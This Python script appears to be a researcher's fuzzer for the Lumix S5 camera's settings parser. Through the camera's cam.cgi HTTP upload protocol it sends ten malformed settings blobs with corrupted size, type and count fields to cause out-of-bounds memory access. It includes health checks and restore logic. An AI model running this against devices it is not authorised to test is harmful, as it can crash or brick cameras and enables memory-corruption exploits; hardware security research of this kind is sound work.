#!/usr/bin/env python3
"""
overflow_fuzz.py — Targeted camsetting PARSER overflow on the S5 camera.

The transport path is well-defended (max chunk ~61192 < 61460 buffer), so a
naive "send more than the buffer" does NOT work. The real surface is the
camsetting PARSER: it trusts size/type fields INSIDE the blob while the
transport only checks the total length. We keep the total length valid and
corrupt the internal fields to induce out-of-bounds access.

SAFETY:
  - AC power assumed ON.
  - Clean blob saved at /tmp/camsetting_clean.bin (recovery).
  - One variant per run by default. After each, health is checked; if the
    camera does not answer we wait for recovery, and if it comes back with
    changed settings we re-upload the clean blob.
  - Never sends valid firmware.

Usage:
  python3 overflow_fuzz.py            # run all variants (auto-stop on bricked)
  python3 overflow_fuzz.py H1 H3 T1   # run specific variants
"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import KA, parse_camrply

IP="192.168.1.131"; PORT=80; BOUNDARY="====LUMIX"; BUF=61192
CLEAN="/tmp/camsetting_clean.bin"

def log(m): print("[%s] %s"%(time.strftime("%H:%M:%S"),m),flush=True)
def health(t=5):
    try:
        ka=KA(IP,port=PORT,timeout=t); st,_,b,dt=ka.request("GET","/cam.cgi?mode=getstate")
        r=parse_camrply(b).get("result","?"); ka.close(); return r
    except: return "OFFLINE"
def wait_ok(mw=180):
    t0=time.time()
    while time.time()-t0<mw:
        if health().lower()=="ok": return True
        time.sleep(5)
    return False

def mp_head(n):
    return ("--%s\r\nContent-Disposition: form-data; name=\"filename\"; filename=\"send\"\r\n"
            "Content-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n"
            "Content-Length: %d\r\n\r\n"%(BOUNDARY,n)).encode()
def mp_tail(): return ("--%s--"%BOUNDARY).encode()

def cmd(ka, path):
    st,_,b,dt=ka.request("GET",path); return parse_camrply(b).get("result","?"), st
def getinfo(ka):
    st,_,b,dt=ka.request("GET","/cam.cgi?mode=getinfo&type=camsetting"); return st,b

def upload_chunked(ka, blob):
    """Upload blob via the proper 61192-byte chunked protocol. Returns endsenddata result."""
    r,_=cmd(ka,"/cam.cgi?mode=startsenddata&type=camsetting&value=%d"%len(blob))
    if r!="ok":
        cmd(ka,"/cam.cgi?mode=abortsenddata"); return "start_rej:%s"%r
    sent=0
    while sent < len(blob):
        n=min(BUF,len(blob)-sent); chunk=blob[sent:sent+n]
        body=mp_head(n)+chunk+mp_tail()
        req=("POST /cam.cgi?mode=senddata HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n"
             "Connection: Keep-Alive\r\nContent-Type: multipart/form-data; boundary=%s\r\n"
             "Content-Length: %d\r\n\r\n"%(IP,BOUNDARY,len(body))).encode()+body
        r="none"
        for attempt in range(1,15):
            st,_,resp,dt=ka.send(req)
            r=parse_camrply(resp).get("result","?")
            if r in ("ok","wifi_reset"): break
            if r in ("err_busy","wait","err_timeout","err_critical"):
                time.sleep(1.5*min(attempt,4)); continue
            break
        if r not in ("ok","wifi_reset"):
            cmd(ka,"/cam.cgi?mode=abortsenddata"); return "chunk_fail@%d:%s"%(sent,r)
        sent+=n; time.sleep(2.5)
        if sent < len(blob):
            for _ in range(20):
                rr,_=cmd(ka,"/cam.cgi?mode=requestsenddata")
                if rr not in ("err_busy","wait","err_timeout"): break
                time.sleep(1.0)
    r,_=cmd(ka,"/cam.cgi?mode=endsenddata")
    return "end:%s"%r

def ensure_clean(ka):
    """Re-upload the clean blob if settings drifted. Returns (drifted, result)."""
    st,b=getinfo(ka)
    if st!=200 or len(b)<1000: return True, "drift_check_fail"
    clean=open(CLEAN,"rb").read()
    if b==clean: return False, "clean"
    log("  settings drifted (len=%d, clean=%d); re-uploading clean"%(len(b),len(clean)))
    r=upload_chunked(ka, clean)
    time.sleep(3); st,b2=getinfo(ka)
    return (b2!=clean), ("restored" if b2==clean else "restore_fail:%s"%r)

# ---- variant builders (all keep total length = len(clean)) ----
def vH1(b):
    c=bytearray(b); struct.pack_into("<I",c,44,0xFFFFFFFF); return bytes(c)
def vH2(b):
    c=bytearray(b); struct.pack_into("<I",c,44,0xFFFF); return bytes(c)
def vH3(b):
    c=bytearray(b); struct.pack_into("<I",c,48,0xFFFFFFFF); return bytes(c)
def vH4(b):
    c=bytearray(b); struct.pack_into("<I",c,48,0xFFFF); return bytes(c)
def vT1(b):
    c=bytearray(b); struct.pack_into("<I",c,len(b)-5,0xFFFFFFFF); return bytes(c)
def vT2(b):
    c=bytearray(b); struct.pack_into("<I",c,len(b)-5,0xFFFF); return bytes(c)
def vE1(b):
    # first entry type field (offset 58) 0x20 -> 0xFFFF
    c=bytearray(b); struct.pack_into("<H",c,58,0xFFFF); return bytes(c)
def vE2(b):
    # find a 0x14 00 type field mid-blob and set to 0xFFFF
    c=bytearray(b); i=b.find(b"\x14\x00\x01\x00", 200)
    if i<0: return b
    struct.pack_into("<H",c,i,0xFFFF); return bytes(c)
def vE3(b):
    # set a count field (the 0x01 00 after a type) to 0xFFFF
    c=bytearray(b); i=b.find(b"\x14\x00\x01\x00", 200)
    if i<0: return b
    struct.pack_into("<H",c,i+2,0xFFFF); return bytes(c)
def vP1(b):
    # Vector E: total 131072 (declare big, pad). Different length -> separate path.
    return b + b"\xAA"*(131072-len(b))

VARIANTS=[
    ("H1 hdr@44=0xFFFFFFFF", vH1),
    ("H2 hdr@44=0xFFFF",      vH2),
    ("H3 hdr@48=0xFFFFFFFF", vH3),
    ("H4 hdr@48=0xFFFF",      vH4),
    ("T1 trailer=0xFFFFFFFF", vT1),
    ("T2 trailer=0xFFFF",     vT2),
    ("E1 entry0 type=0xFFFF", vE1),
    ("E2 entry type=0xFFFF",  vE2),
    ("E3 entry count=0xFFFF", vE3),
    ("P1 total=131072",       vP1),
]

def main():
    log("camsetting PARSER overflow fuzz target=%s"%IP)
    if not os.path.exists(CLEAN):
        log("no clean blob; downloading")
        ka=KA(IP,port=PORT,timeout=20); st,b,dt=ka.request("GET","/cam.cgi?mode=getinfo&type=camsetting"); ka.close()
        if st!=200 or len(b)<1000: log("download fail st=%s len=%d"%(st,len(b))); return
        open(CLEAN,"wb").write(b)
    clean=open(CLEAN,"rb").read()
    log("clean blob: %d bytes"%len(clean))
    if not wait_ok(60): log("not ready; abort"); return

    sel=sys.argv[1:]
    for name, fn in VARIANTS:
        if sel and name.split()[0] not in sel:
            continue
        log("\n"+"="*60); log("VARIANT %s (base len=%d)"%(name,len(clean))); log("="*60)
        blob=fn(clean)
        try:
            ka=KA(IP,port=PORT,timeout=30)
            r=upload_chunked(ka, blob)
            log("  upload: %s"%r)
        except Exception as e:
            log("  upload EXC %s: %s"%(type(e).__name__,e))
        # health
        time.sleep(3)
        h=health()
        log("  [health] %s"%h)
        if h.lower()!="ok":
            log("  !! camera not ok. waiting for recovery (180s)...")
            rec=wait_ok(180)
            if not rec:
                log("  !! NOT RECOVERING. STOP. (may need battery pull / re-flash)")
                return
            log("  recovered. health=%s"%health())
        # settings drift check + auto-restore
        try:
            ka=KA(IP,port=PORT,timeout=30)
            drifted, res=ensure_clean(ka); ka.close()
            log("  [drift] %s"%res)
        except Exception as e:
            log("  [drift] EXC %s: %s"%(type(e).__name__,e))
        log("  VARIANT %s COMPLETE (health=%s)"%(name,health()))
    log("\nALL VARIANTS DONE. final health=%s"%health())

if __name__=="__main__":
    main()
